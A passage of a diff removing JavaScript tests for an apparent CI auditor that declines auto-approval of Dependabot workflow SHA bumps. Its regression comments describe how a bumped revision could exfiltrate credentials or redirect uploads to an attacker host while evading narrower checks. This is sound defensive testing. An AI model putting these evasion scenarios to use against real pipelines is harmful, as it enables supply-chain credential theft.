-      assert.ok(
-        contractFindingMessage(findings).includes(expected),
-        contractFindingMessage(findings),
-      );
-    }
-  });
-}
-
-for (const failing of ["/git/matching-refs/tags/", "/releases/tags/v0.0.1"]) {
-  test(`Dependabot SHA bump release check declines when ${failing} errors`, async () => {
-    const findings = await releaseCheckFindings(
-      (inner) => async (url, init) =>
-        url.endsWith(failing)
-          ? { ok: false, status: 500, statusText: "Internal Server Error" }
-          : inner(url, init),
-    );
-    assert.ok(
-      contractFindingMessage(findings).includes(
-        `${DEPENDABOT_BUMP_REFERENCE} could not be checked against the release tags of melodic-software/ci-workflows: 500 Internal Server Error, so auto-approval is declined`,
-      ),
-      contractFindingMessage(findings),
-    );
-  });
-}
-
-test("Dependabot SHA bump declines ambiguous surface-matching reviewed contracts independent of insertion order", async () => {
-  const runnerContract = ({
-    runnerInput = "runner",
-    allowedInputs = [runnerInput],
-    allowedSecrets = {},
-    ...reviewedTerms
-  } = {}) => ({
-    routing: "runner-input",
-    runnerInput,
-    allowedInputs,
-    allowedSecrets,
-    ...reviewedTerms,
-  });
-  const hostedContract = (fixedRunsOn) => ({
-    routing: "hosted-only",
-    allowedInputs: [],
-    allowedSecrets: {},
-    fixedRunsOn,
-  });
-  const disagreements = [
-    [
-      "inputs",
-      runnerContract({ allowedInputs: ["runner", "extra"] }),
-      runnerContract(),
-      "allowedInputs",
-    ],
-    [
-      "secrets",
-      runnerContract({
-        allowedSecrets: { token: `\${{ secrets.REUSABLE_TOKEN }}` },
-      }),
-      runnerContract(),
-      "allowedSecrets",
-    ],
-    [
-      "runner input",
-      runnerContract(),
-      runnerContract({ runnerInput: "executor" }),
-      "allowedInputs, runnerInput",
-    ],
-    [
-      "hosted routing",
-      hostedContract(["ubuntu-24.04"]),
-      hostedContract(["windows-2025"]),
-      "fixedRunsOn",
-    ],
-    [
-      "minimum caller permissions",
-      runnerContract({ minimumCallerPermissions: { contents: "read" } }),
-      runnerContract(),
-      "minimumCallerPermissions",
-    ],
-  ];
-
-  for (const [name, firstContract, secondContract, fields] of disagreements) {
-    let expectedDiagnostic;
-    for (const reverse of [false, true]) {
-      const entries = [
-        [REUSABLE_REFERENCE, firstContract],
-        [ALTERNATE_REUSABLE_REFERENCE, secondContract],
-      ];
-      if (reverse) {
-        entries.reverse();
-      }
-      const root = await repository({
-        visibility: "public",
-        selfHostedCi: false,
-        policyOverrides: {
-          approvedReusableWorkflowContracts: Object.fromEntries(entries),
-        },
-        workflows: {
-          "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-        },
-      });
-      const findings = await audit(root, {
-        fetchImpl: fetchImplFor({
-          [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-          [ALTERNATE_REVIEWED_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-          [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
-        }),
-      });
-      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-      assert.ok(contractFinding, `${name}, reverse=${reverse}`);
-      const diagnostic = contractFinding.message.match(/auto-approval declined: (.*)\)$/)?.[1];
-      assert.ok(diagnostic, `${name}, reverse=${reverse}`);
-      assert.match(
-        diagnostic,
-        new RegExp(
-          `^surface-matching reviewed revisions of .* disagree on effective reviewed contract terms \\(${fields}\\): ${SHA}, ${ALTERNATE_REVIEWED_SHA}$`,
-        ),
-        `${name}, reverse=${reverse}`,
-      );
-      if (expectedDiagnostic === undefined) {
-        expectedDiagnostic = diagnostic;
-      } else {
-        assert.equal(diagnostic, expectedDiagnostic, `${name} diagnostic must be insertion-stable`);
-      }
-    }
-  }
-});
-
-test("Dependabot SHA bump declines partial reviewed-basis evidence independent of insertion order", async () => {
-  const strictContract = {
-    routing: "runner-input",
-    runnerInput: "runner",
-    allowedInputs: ["runner"],
-    allowedSecrets: {},
-  };
-  const broaderContract = {
-    ...strictContract,
-    allowedInputs: ["runner", "extra"],
-  };
-  const failures = [
-    ["unreachable", undefined, /404 Not Found/u],
-    ["parse-invalid", "name: [unterminated\n", /flow sequence|parse/iu],
-  ];
-
-  for (const [name, alternateSource, reasonPattern] of failures) {
-    let expectedDiagnostic;
-    for (const reverse of [false, true]) {
-      const entries = [
-        [REUSABLE_REFERENCE, strictContract],
-        [ALTERNATE_REUSABLE_REFERENCE, broaderContract],
-      ];
-      if (reverse) {
-        entries.reverse();
-      }
-      const root = await repository({
-        visibility: "public",
-        selfHostedCi: false,
-        policyOverrides: {
-          approvedReusableWorkflowContracts: Object.fromEntries(entries),
-        },
-        workflows: {
-          "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-        },
-      });
-      const sources = {
-        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
-        ...(alternateSource === undefined ? {} : { [ALTERNATE_REVIEWED_SHA]: alternateSource }),
-      };
-      const findings = await audit(root, { fetchImpl: fetchImplFor(sources) });
-      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-      assert.ok(contractFinding, `${name}, reverse=${reverse}`);
-      const diagnostic = contractFinding.message.match(
-        /auto-approval declined: ([\s\S]*)\)$/u,
-      )?.[1];
-      assert.ok(diagnostic, `${name}, reverse=${reverse}`);
-      assert.match(
-        diagnostic,
-        new RegExp(
-          `^reviewed basis ${REUSABLE_PATH}@${ALTERNATE_REVIEWED_SHA} could not be fetched, parsed, or validated: `,
-        ),
-        `${name}, reverse=${reverse}`,
-      );
-      assert.match(diagnostic, reasonPattern, `${name}, reverse=${reverse}`);
-      if (expectedDiagnostic === undefined) {
-        expectedDiagnostic = diagnostic;
-      } else {
-        assert.equal(diagnostic, expectedDiagnostic, `${name} diagnostic must be insertion-stable`);
-      }
-    }
-  }
-});
-
-test("Dependabot SHA bump accepts all reachable surface-matching bases with one effective contract", async () => {
-  const contract = {
-    routing: "runner-input",
-    runnerInput: "runner",
-    allowedInputs: ["runner"],
-    allowedSecrets: {},
-  };
-  for (const reverse of [false, true]) {
-    const entries = [
-      [REUSABLE_REFERENCE, contract],
-      [ALTERNATE_REUSABLE_REFERENCE, { ...contract }],
-    ];
-    if (reverse) {
-      entries.reverse();
-    }
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      policyOverrides: {
-        approvedReusableWorkflowContracts: Object.fromEntries(entries),
-      },
-      workflows: {
-        "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-      },
-    });
-    assert.deepEqual(
-      await audit(root, {
-        fetchImpl: fetchImplFor({
-          [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-          [ALTERNATE_REVIEWED_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-          [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
-        }),
-      }),
-      [],
-      `reverse=${reverse}`,
-    );
-  }
-});
-
-test("Dependabot SHA bump that adds write permissions is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_PERMISSIONS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(contractFinding.message, /no reviewed runner-input contract/);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: permissions changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump that adds a workflow_call input is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_INPUTS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(`auto-approval declined: inputs changed since the previously reviewed .*@${SHA}`),
-  );
-});
-
-test("Dependabot SHA bump that adds a job-level permissions grant is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_JOB_PERMISSIONS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: jobPermissions changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump that flips a job's runs-on to self-hosted is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_RUNS_ON_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
-  );
-});
-
-// Regression test for a gap where a called job's fetched steps/env were
-// outside the compared auto-approval surface: permissions, workflow_call,
-// and runs-on could stay identical while a bumped SHA added a
-// localCredentialActions entry (e.g. actions/create-github-app-token) to a
-// called job's steps, and the reusable job would still be auto-approved and
-// inherit the old self-hosted contract without the same privileged-hosted
-// credential check already enforced against direct/local jobs.
-test("Dependabot SHA bump that adds a credential-minting action to a called job's steps is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_ADDED_CREDENTIAL_ACTION_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentials changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Regression test for a gap where jobCredentialSurface recorded only
-// privilegedHostedRequirement()'s category (e.g. "an unapproved or
-// transformed credential expression"), not the exact credential-bearing
-// value itself. A bumped SHA that swaps one already-declared/allowed secret
-// for a different secret in the identical step env position trips the same
-// category on both revisions, so that coarse comparison alone would let the
-// candidate silently inherit the previously reviewed contract even though
-// the actual secret referenced changed.
-test("Dependabot SHA bump that changes only the exact secret referenced in a called job's step env is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_REFERENCE_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_CREDENTIAL_REFERENCE_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Regression test for a gap where jobCredentialReferenceSurface recorded only
-// the fields of a credential-bearing step that themselves contained a
-// credential expression (condition/env/with, filtered through
-// credentialBearingEntries), never the rest of the step. A bumped SHA could
-// keep an already-reviewed step's env/with credential expression
-// byte-identical while rewriting the step's run: body -- e.g. from a benign
-// scan command to one that exfiltrates the same credential -- and the
-// filtered surface would stay unchanged, silently auto-approving unreviewed
-// executable code that consumes the credential differently.
-test("Dependabot SHA bump that changes only a credential-bearing step's run body is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Regression test proving the credential-bearing gate itself checks every
-// field family. This step's only credential expression is inline in `run:`,
-// with no env or with block, so it is invisible to a gate that only checks
-// condition/env/with/credentialAction; such a gate would drop the step out
-// of credentialReferences entirely, and a bump that swaps only the
-// referenced secret would leave every recorded surface field identical.
-test("Dependabot SHA bump that changes only the secret referenced inline in a credential-bearing step's run body is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Regression test for a gap where a reviewed contract already containing a
-// localCredentialActions step (e.g. actions/create-github-app-token) only
-// had its category -- not its pinned `@ref` -- recorded anywhere in the
-// compared surface: jobCredentialSurface's privilegedHostedRequirement names
-// only the bare action, and credentialBearingEntries never records a plain
-// `uses:` action reference because it mints no credential expression by
-// itself. A Dependabot bump that repoints the same credential-minting action
-// at a different, unreviewed ref left every compared field byte-identical
-// and was auto-approved, letting newly unreviewed token-minting code run
-// under the previously reviewed runner-input contract.
-test("Dependabot SHA bump that changes only the pinned ref of an existing credential-minting action is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Regression test for a gap where the credential-reference surface recorded
-// a workflow-scope env entry only when that entry's own value contained a
-// credential expression, and recorded a step only when the step itself was
-// credential-bearing. A workflow-scope `env: SCAN_TOKEN: ${{ secrets.X }}`
-// is exported to every step's process environment, so a bumped SHA could
-// rewrite a step body that consumes $SCAN_TOKEN -- a body containing no
-// credential expression of its own -- while every recorded surface field
-// stayed byte-identical, and the new SHA inherited the reviewed contract.
-test("Dependabot SHA bump that rewrites a step consuming an inherited workflow-env credential is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_STEP_BODY_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Same gap, other direction: the credential env entry and every step stay
-// byte-identical while the sibling UPLOAD_URL env value that decides where
-// the token-bearing upload goes moves to an attacker host. The filtered
-// surface recorded only the env entries that themselves contained a
-// credential expression, so the sibling value was invisible to the diff.
-test("Dependabot SHA bump that changes only a sibling workflow-env value next to an inherited credential is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_SIBLING_VALUE_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Job-scope env reaches that job's steps exactly like workflow-scope env
-// reaches every job's steps; the inherited-credential gate must fire on
-// both scopes.
-test("Dependabot SHA bump that rewrites a step consuming an inherited job-env credential is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_JOB_ENV_STEP_BODY_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-// Positive control: the inherited-credential gate widens what is recorded,
-// not what is rejected -- a workflow that carries a workflow-scope
-// credential env but whose recorded surface is genuinely unchanged must
-// still auto-approve.
-test("Dependabot SHA bump with an unchanged inherited-credential-env surface is auto-approved", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_COSMETIC_SOURCE,
-    }),
-  });
-  assert.deepEqual(findings, []);
-});
-
-test("Dependabot SHA bump that changes a privileged execution boundary is declined", async () => {
-  const nestedSha = "0123456789abcdef0123456789abcdef01234567";
-  const candidates = [
-    [
-      "job container",
-      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
-        "    steps: []",
-        "    container: node:24\n    steps: []",
-      ),
-    ],
-    [
-      "service container",
-      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
-        "    steps: []",
-        "    services:\n      redis:\n        image: redis:8\n    steps: []",
-      ),
-    ],
-    [
-      "deployment environment",
-      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
-        "    steps: []",
-        "    environment: production\n    steps: []",
-      ),
-    ],
-    [
-      "nested reusable workflow",
-      REUSABLE_WORKFLOW_BASIS_SOURCE.replace(
-        "    runs-on: $" + "{{ inputs.runner }}\n    steps: []",
-        `    uses: example/reusable/.github/workflows/nested.yml@${nestedSha}`,
-      ),
-    ],
-  ];
-
-  for (const [name, candidateSource] of candidates) {
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      workflows: {
-        "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-      },
-    });
-    const findings = await audit(root, {
-      fetchImpl: fetchImplFor({
-        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: candidateSource,
-      }),
-    });
-    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-    assert.ok(contractFinding, name);
-    assert.match(
-      contractFinding.message,
-      new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
-      name,
-    );
-  }
-});
-
-test("Dependabot SHA bump from empty to omitted workflow permissions is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_EMPTY_PERMISSIONS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: permissions changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump from empty to omitted effective job permissions is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_EMPTY_JOB_PERMISSIONS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: jobPermissions changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump that removes workflow_call is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_REMOVED_WORKFLOW_CALL_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: workflowCall changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump with a malformed workflow_call declaration is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_MALFORMED_WORKFLOW_CALL_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: workflowCall changed since the previously reviewed .*@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump with malformed workflow_call input or secret maps is declined", async () => {
-  for (const field of ["inputs", "secrets"]) {
-    for (const [kind, value] of [
-      ["boolean", "false"],
-      ["scalar", "malformed"],
-      ["array", "[]"],
-    ]) {
-      const root = await repository({
-        visibility: "public",
-        selfHostedCi: false,
-        policyOverrides: {
-          approvedReusableWorkflowContracts: {
-            [REUSABLE_REFERENCE]: {
-              routing: "hosted-only",
-              allowedInputs: [],
-              allowedSecrets: {},
-              fixedRunsOn: ["ubuntu-24.04"],
-            },
-          },
-        },
-        workflows: {
-          "ci.yml": `jobs:
-  check:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-`,
-        },
-      });
-      const findings = await audit(root, {
-        fetchImpl: fetchImplFor({
-          [SHA]: reusableWorkflowWithCallMappings(),
-          [DEPENDABOT_BUMP_SHA]: reusableWorkflowWithCallMappings({ [field]: value }),
-        }),
-      });
-      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-      assert.ok(contractFinding, `${field} ${kind}`);
-      assert.match(
-        contractFinding.message,
-        new RegExp(
-          `auto-approval declined: ${field} declaration is malformed; on\\.workflow_call\\.${field} must be a mapping when declared`,
-        ),
-        `${field} ${kind}`,
-      );
-    }
-  }
-});
-
-test("Dependabot SHA bump preserves equivalent omitted, null, and empty workflow_call maps", async () => {
-  for (const [name, basisSource, candidateSource] of [
-    [
-      "omitted to explicit empty",
-      reusableWorkflowWithCallMappings(),
-      reusableWorkflowWithCallMappings({ inputs: "{}", secrets: "{}" }),
-    ],
-    [
-      "explicit empty to null",
-      reusableWorkflowWithCallMappings({ inputs: "{}", secrets: "{}" }),
-      reusableWorkflowWithCallMappings({ inputs: null, secrets: null }),
-    ],
-    [
-      "null to omitted",
-      reusableWorkflowWithCallMappings({ inputs: null, secrets: null }),
-      reusableWorkflowWithCallMappings(),
-    ],
-  ]) {
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      policyOverrides: {
-        approvedReusableWorkflowContracts: {
-          [REUSABLE_REFERENCE]: {
-            routing: "hosted-only",
-            allowedInputs: [],
-            allowedSecrets: {},
-            fixedRunsOn: ["ubuntu-24.04"],
-          },
-        },
-      },
-      workflows: {
-        "ci.yml": `jobs:
-  check:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-`,
-      },
-    });
-    assert.deepEqual(
-      await audit(root, {
-        fetchImpl: fetchImplFor({
-          [SHA]: basisSource,
-          [DEPENDABOT_BUMP_SHA]: candidateSource,
-        }),
-      }),
-      [],
-      name,
-    );
-  }
-});
-
-// Regression test for a gap where jobPermissionsSurface, jobRoutingSurface,
-// and jobCredentialSurface each filtered out a job whose value was not a
-// mapping (the same shape auditRepository rejects locally as job-shape)
-// before comparing surfaces. Filtering made the malformed job invisible to
-// the diff instead of failing closed: a bumped SHA could add
-// `jobs.extra: []` or a scalar job without changing anything the compared
-// surface inspected, so the candidate would still match the reviewed basis
-// and inherit its contract, only to fail later when GitHub actually
-// validated the called workflow.
-test("Dependabot SHA bump that adds a malformed job is declined", async () => {
-  for (const [kind, malformedJob] of [
-    ["array", "  extra: []\n"],
-    ["scalar", "  extra: not-a-job\n"],
-  ]) {
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
